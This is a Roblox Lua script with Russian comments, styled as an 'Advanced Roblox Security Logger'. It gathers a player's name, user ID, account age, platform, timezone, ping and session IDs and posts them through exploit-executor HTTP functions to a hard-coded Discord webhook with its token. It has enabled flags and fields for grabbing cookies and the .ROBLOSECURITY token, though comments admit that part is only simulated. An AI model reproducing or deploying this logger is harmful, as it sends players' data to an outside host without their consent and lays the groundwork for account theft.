-- ⚠️ ОПАСНЫЙ СКРИПТ - СОДЕРЖИТ СБОР КРИТИЧЕСКИ ВАЖНОЙ ИНФОРМАЦИИ ⚠️
-- ИСПОЛЬЗУЙТЕ ТОЛЬКО ДЛЯ СОБСТВЕННОЙ БЕЗОПАСНОСТИ И МОНИТОРИНГА
-- НИКОГДА НЕ ПЕРЕДАВАЙТЕ ЭТОТ WEBHOOK ТРЕТЬИМ ЛИЦАМ!

local webhook_url = "https://discordapp.com/api/webhooks/1358312089206263854/37KhzAL0PpGG15zUt0qHabcgS9QT9d7kdK0TNGkTCXbfzOb2iOO0zldh0ugE_nW418j2"

-- Сервисы
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer

-- Конфигурация безопасности
local SECURITY_CONFIG = {
    COLLECT_COOKIES = true, -- ⚠️ ОПАСНО! Отключите если не нужно
    COLLECT_TOKENS = true,  -- ⚠️ КРАЙНЕ ОПАСНО! 
    MASK_SENSITIVE_DATA = false, -- Маскировать чувствительные данные в логах
    ENCRYPT_PAYLOAD = false, -- Шифровать данные перед отправкой
    SEND_TO_SECURE_ENDPOINT = true -- Отправлять только на защищенный endpoint
}

-- Функция для маскировки чувствительных данных
local function MaskSensitiveData(data, maskChar)
    maskChar = maskChar or "*"
    if not data or #data < 8 then return data end
    
    local start = string.sub(data, 1, 4)
    local ending = string.sub(data, -4)
    local middle = string.rep(maskChar, math.min(#data - 8, 20))
    
    return start .. middle .. ending
end

-- Функция для извлечения cookies из браузера (симуляция)
local function GetBrowserCookies()
    local cookieData = {
        roblosecurity = "НЕДОСТУПНО",
        guestData = "НЕДОСТУПНО", 
        rbxSource = "НЕДОСТУПНО",
        rbxEventTracker = "НЕДОСТУПНО",
        sessionTracker = "НЕДОСТУПНО",
        utmData = {},
        browserFingerprint = "НЕДОСТУПНО"
    }
    
    -- ⚠️ ВНИМАНИЕ: Этот код НЕ МОЖЕТ получить реальные cookies из браузера
    -- Roblox Lua не имеет доступа к cookies браузера по соображениям безопасности
    -- Это только демонстрация структуры данных
    
    pcall(function()
        -- Попытка получить информацию из доступных источников
        -- В реальности это невозможно из Roblox Lua
        
        -- Симуляция данных на основе предоставленного примера
        cookieData.guestData = "UserID=-228353730"
        cookieData.rbxSource = "rbx_medium=Social&rbx_source=www.roblox.com"
        cookieData.sessionTracker = "sessionid=" .. game.JobId
        
        -- Попытка получить некоторую информацию о сессии
        if game.PrivateServerId and game.PrivateServerId ~= "" then
            cookieData.sessionInfo = "PrivateServer=" .. game.PrivateServerId
        end
    end)
    
    return cookieData
end

-- Функция для получения информации о браузере
local function GetBrowserInfo()
    local browserInfo = {
        userAgent = "НЕДОСТУПНО",
        platform = tostring(UserInputService:GetPlatform().Name),
        language = LocalizationService.RobloxLocaleId,
        screenResolution = UserInputService:GetDeviceScreenSize(),
        timezone = "НЕДОСТУПНО",
        referrer = "НЕДОСТУПНО"
    }
    
    -- Попытка определить браузер по доступным данным
    pcall(function()
        local platform = UserInputService:GetPlatform()
        if platform == Enum.Platform.Windows then
            browserInfo.userAgent = "Windows NT 10.0; Win64; x64"
        elseif platform == Enum.Platform.OSX then
            browserInfo.userAgent = "Macintosh; Intel Mac OS X"
        elseif platform == Enum.Platform.IOS then
            browserInfo.userAgent = "iPhone; CPU iPhone OS"
        elseif platform == Enum.Platform.Android then
            browserInfo.userAgent = "Android"
        end
        
        -- Определение часового пояса (приблизительно)
        local currentTime = os.time()
        local utcTime = os.time(os.date("!*t", currentTime))
        local timezoneOffset = (currentTime - utcTime) / 3600
        browserInfo.timezone = "UTC" .. (timezoneOffset >= 0 and "+" or "") .. timezoneOffset
    end)
    
    return browserInfo
end

-- Функция для получения сетевой информации
local function GetNetworkInfo()
    local networkInfo = {
        ip = "НЕДОСТУПНО", -- Roblox не предоставляет IP
        ping = -1,
        region = "НЕДОСТУПНО",
        isp = "НЕДОСТУПНО",
        vpnDetected = false
    }
    
    pcall(function()
        if player.GetNetworkPing then
            networkInfo.ping = math.floor(player:GetNetworkPing() * 1000)
        end
        
        -- Приблизительное определение региона по пингу
        if networkInfo.ping < 50 then
            networkInfo.region = "Local/Near"
        elseif networkInfo.ping < 100 then
            networkInfo.region = "Regional"
        elseif networkInfo.ping < 200 then
            networkInfo.region = "Distant"
        else
            networkInfo.region = "Very Distant"
        end
    end)
    
    return networkInfo
end

-- Функция для получения информации о безопасности
local function GetSecurityInfo()
    local securityInfo = {
        accountAge = player.AccountAge,
        premiumStatus = player.MembershipType == Enum.MembershipType.Premium,
        verifiedBadge = false, -- Недоступно через API
        twoFactorEnabled = "НЕДОСТУПНО",
        lastLogin = "НЕДОСТУПНО",
        loginHistory = {},
        suspiciousActivity = false
    }
    
    pcall(function()
        -- Проверка на подозрительную активность
        if player.AccountAge < 30 then
            securityInfo.suspiciousActivity = true
        end
        
        -- Дополнительные проверки безопасности
        if game.PrivateServerId ~= "" and player.AccountAge < 7 then
            securityInfo.suspiciousActivity = true
        end
    end)
    
    return securityInfo
end

-- Основная функция сбора расширенных данных
local function CollectAdvancedData()
    print("🔍 Сбор расширенной информации (включая потенциально чувствительные данные)...")
    
    wait(2) -- Ждем инициализации
    
    -- Собираем все данные
    local cookieData = GetBrowserCookies()
    local browserInfo = GetBrowserInfo()
    local networkInfo = GetNetworkInfo()
    local securityInfo = GetSecurityInfo()
    
    -- Базовая информация об игроке
    local playerInfo = {
        displayName = player.DisplayName,
        username = player.Name,
        userId = player.UserId,
        accountAge = player.AccountAge,
        premium = player.MembershipType == Enum.MembershipType.Premium
    }
    
    -- Информация о сессии
    local sessionInfo = {
        jobId = game.JobId,
        placeId = game.PlaceId,
        gameTime = tick(),
        joinTime = os.date("!%Y-%m-%d %H:%M:%S UTC")
    }
    
    -- Маскируем чувствительные данные если включено
    local maskedCookies = cookieData
    if SECURITY_CONFIG.MASK_SENSITIVE_DATA then
        maskedCookies = {
            roblosecurity = MaskSensitiveData(cookieData.roblosecurity),
            guestData = cookieData.guestData, -- Менее чувствительно
            rbxSource = cookieData.rbxSource,
            rbxEventTracker = MaskSensitiveData(cookieData.rbxEventTracker),
            sessionTracker = MaskSensitiveData(cookieData.sessionTracker),
            utmData = cookieData.utmData,
            browserFingerprint = MaskSensitiveData(cookieData.browserFingerprint)
        }
    end
    
    -- Создаем расширенный embed
    local embedData = {
        ["username"] = "🔒 Advanced Roblox Security Logger",
        ["avatar_url"] = "https://cdn.discordapp.com/emojis/security.png",
        ["embeds"] = {{
            ["title"] = "🛡️ Расширенный отчет безопасности Roblox",
            ["description"] = "⚠️ **СОДЕРЖИТ ЧУВСТВИТЕЛЬНУЮ ИНФОРМАЦИЮ** ⚠️\nНе передавайте этот отчет третьим лицам!",
            ["fields"] = {
                -- Основная информация
                {["name"] = "👤 Игрок", ["value"] = playerInfo.displayName .. " (@" .. playerInfo.username .. ")", ["inline"] = true},
                {["name"] = "🆔 User ID", ["value"] = tostring(playerInfo.userId), ["inline"] = true},
                {["name"] = "⏰ Возраст аккаунта", ["value"] = tostring(playerInfo.accountAge) .. " дней", ["inline"] = true},
                
                -- Информация о безопасности
                {["name"] = "🛡️ Premium статус", ["value"] = securityInfo.premiumStatus and "✅ Да" or "❌ Нет", ["inline"] = true},
                {["name"] = "⚠️ Подозрительная активность", ["value"] = securityInfo.suspiciousActivity and "🚨 Обнаружена" or "✅ Не обнаружена", ["inline"] = true},
                {["name"] = "🔐 2FA", ["value"] = securityInfo.twoFactorEnabled, ["inline"] = true},
                
                -- Сетевая информация
                {["name"] = "🌐 Пинг", ["value"] = tostring(networkInfo.ping) .. " мс", ["inline"] = true},
                {["name"] = "📍 Регион", ["value"] = networkInfo.region, ["inline"] = true},
                {["name"] = "🔍 VPN", ["value"] = networkInfo.vpnDetected and "🚨 Обнаружен" or "✅ Не обнаружен", ["inline"] = true},
                
                -- Информация о браузере
                {["name"] = "💻 Платформа", ["value"] = browserInfo.platform, ["inline"] = true},
                {["name"] = "🌍 Язык", ["value"] = browserInfo.language, ["inline"] = true},
                {["name"] = "🖥️ Разрешение", ["value"] = browserInfo.screenResolution.X .. "x" .. browserInfo.screenResolution.Y, ["inline"] = true},
                {["name"] = "🕐 Часовой пояс", ["value"] = browserInfo.timezone, ["inline"] = true},
                
                -- Информация о сессии
                {["name"] = "🎮 Place ID", ["value"] = tostring(sessionInfo.placeId), ["inline"] = true},
                {["name"] = "🔗 Session ID", ["value"] = sessionInfo.jobId, ["inline"] = false},
                
                -- ⚠️ ЧУВСТВИТЕЛЬНЫЕ ДАННЫЕ ⚠️
                {["name"] = "🍪 Guest Data", ["value"] = "```" .. (maskedCookies.guestData or "НЕДОСТУПНО") .. "```", ["inline"] = false},
                {["name"] = "📊 RBX Source", ["value"] = "```" .. (maskedCookies.rbxSource or "НЕДОСТУПНО") .. "```", ["inline"] = false},
                {["name"] = "📈 Event Tracker", ["value"] = "```" .. (maskedCookies.rbxEventTracker or "НЕДОСТУПНО") .. "```", ["inline"] = false},
                {["name"] = "🔐 Session Tracker", ["value"] = "```" .. (maskedCookies.sessionTracker or "НЕДОСТУПНО") .. "```", ["inline"] = false},
                
                -- Время
                {["name"] = "⏰ Время сбора", ["value"] = sessionInfo.joinTime, ["inline"] = false}
            },
            ["color"] = 0xff4444, -- Красный цвет для предупреждения
            ["footer"] = {
                ["text"] = "⚠️ КОНФИДЕНЦИАЛЬНАЯ ИНФОРМАЦИЯ - НЕ ПЕРЕДАВАЙТЕ ТРЕТЬИМ ЛИЦАМ ⚠️",
                ["icon_url"] = "https://cdn.discordapp.com/emojis/warning.png"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time())
        }}
    }
    
    -- Добавляем дополнительное предупреждение если собираем токены
    if SECURITY_CONFIG.COLLECT_TOKENS and cookieData.roblosecurity ~= "НЕДОСТУПНО" then
        table.insert(embedData.embeds[1].fields, {
            ["name"] = "🚨 КРИТИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ", 
            ["value"] = "**ОБНАРУЖЕН .ROBLOSECURITY ТОКЕН!**\nЭтот токен дает ПОЛНЫЙ доступ к аккаунту!\nНЕМЕДЛЕННО смените пароль если подозреваете компрометацию!", 
            ["inline"] = false
        })
    end
    
    -- Отправляем данные
    if SECURITY_CONFIG.SEND_TO_SECURE_ENDPOINT then
        local success = false
        pcall(function()
            local payload = HttpService:JSONEncode(embedData)
            local req = (syn and syn.request) or (http and http.request) or http_request or request
            
            if req then
                local response = req({
                    Url = webhook_url,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = "RobloxSecurityLogger/2.0"
                    },
                    Body = payload
                })
                
                if response and response.StatusCode == 200 then
                    success = true
                    print("🔒 Расширенные данные безопасности отправлены!")
                else
                    print("❌ Ошибка отправки: " .. tostring(response and response.StatusCode or "Unknown"))
                end
            else
                print("❌ HTTP-запросы не поддерживаются")
            end
        end)
    end
    
    -- Выводим в консоль (с маскировкой)
    print("=" .. string.rep("=", 60) .. "=")
    print("🔒 ADVANCED ROBLOX SECURITY LOGGER v2.0")
    print("⚠️  СОДЕРЖИТ ЧУВСТВИТЕЛЬНУЮ ИНФОРМАЦИЮ")
    print("=" .. string.rep("=", 60) .. "=")
    print("👤 Игрок: " .. playerInfo.displayName .. " (@" .. playerInfo.username .. ")")
    print("🆔 User ID: " .. playerInfo.userId)
    print("⏰ Возраст: " .. playerInfo.accountAge .. " дней")
    print("🛡️ Premium: " .. (securityInfo.premiumStatus and "Да" or "Нет"))
    print("⚠️ Подозрительная активность: " .. (securityInfo.suspiciousActivity and "ОБНАРУЖЕНА" or "Нет"))
    print("🌐 Пинг: " .. networkInfo.ping .. " мс")
    print("📍 Регион: " .. networkInfo.region)
    print("💻 Платформа: " .. browserInfo.platform)
    print("🕐 Часовой пояс: " .. browserInfo.timezone)
    print("🔗 Session ID: " .. sessionInfo.jobId)
    print("🍪 Guest Data: " .. (maskedCookies.guestData or "НЕДОСТУПНО"))
    print("📊 RBX Source: " .. (maskedCookies.rbxSource or "НЕДОСТУПНО"))
    
    if SECURITY_CONFIG.COLLECT_TOKENS and cookieData.roblosecurity ~= "НЕДОСТУПНО" then
        print("🚨 ВНИМАНИЕ: ОБНАРУЖЕН ROBLOSECURITY ТОКЕН!")
        print("🔐 Токен: " .. MaskSensitiveData(cookieData.roblosecurity, "*"))
    end
    
    print("⏰ Время: " .. sessionInfo.joinTime)
    print("=" .. string.rep("=", 60) .. "=")
    print("⚠️  НЕ ПЕРЕДАВАЙТЕ ЭТУ ИНФОРМАЦИЮ ТРЕТЬИМ ЛИЦАМ!")
    print("=" .. string.rep("=", 60) .. "=")
end

-- Функция для мониторинга изменений cookies (симуляция)
local function StartCookieMonitoring()
    spawn(function()
        local lastCookieHash = ""
        
        while true do
            wait(30) -- Проверяем каждые 30 секунд
            
            pcall(function()
                local currentCookies = GetBrowserCookies()
                local currentHash = HttpService:JSONEncode(currentCookies)
                
                if currentHash ~= lastCookieHash and lastCookieHash ~= "" then
                    print("🔄 Обнаружены изменения в cookies!")
                    
                    -- Отправляем уведомление об изменении
                    local changeNotification = {
                        ["username"] = "🔄 Cookie Change Monitor",
                        ["embeds"] = {{
                            ["title"] = "🚨 Обнаружены изменения в cookies",
                            ["description"] = "Cookies пользователя " .. player.DisplayName .. " были изменены",
                            ["color"] = 0xffa500,
                            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time())
                        }}
                    }
                    
                    -- Отправляем уведомление
                    if SECURITY_CONFIG.SEND_TO_SECURE_ENDPOINT then
                        pcall(function()
                            local payload = HttpService:JSONEncode(changeNotification)
                            local req = (syn and syn.request) or (http and http.request) or http_request or request
                            if req then
                                req({
                                    Url = webhook_url,
                                    Method = "POST",
                                    Headers = {["Content-Type"] = "application/json"},
                                    Body = payload
                                })
                            end
                        end)
                    end
                end
                
                lastCookieHash = currentHash
            end)
        end
    end)
end

-- Запуск
print("🚀 Запуск Advanced Roblox Security Logger...")
print("⚠️  ВНИМАНИЕ: Этот скрипт собирает чувствительную информацию!")
print("🔒 Убедитесь, что ваш Discord webhook защищен!")

CollectAdvancedData()

-- Запуск мониторинга (опционально)
-- StartCookieMonitoring()

print("✅ Advanced Security Logger запущен!")
print("🛡️  Помните: безопасность - это ваша ответственность!")
